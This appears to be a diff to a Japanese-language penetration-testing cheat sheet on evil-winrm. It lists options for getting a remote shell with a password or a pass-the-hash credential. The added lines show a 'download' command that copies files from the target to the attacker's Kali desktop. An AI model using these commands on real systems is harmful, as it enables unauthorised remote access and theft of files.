@@ -9,3 +9,7 @@ evil-winrm -i <domain name> -u <user name>
 -H <hash> #パスザハッシュ
 -p <pass> #パスワードの使用
 -i <domain or IP> #ドメインでもIPでもいい
+
+これで取れたシェルはバックグラウンドのkaliを認識しているので
+download <file name> /home/kali/Desktop/<file name>
+などでローカルにダウンロードできる
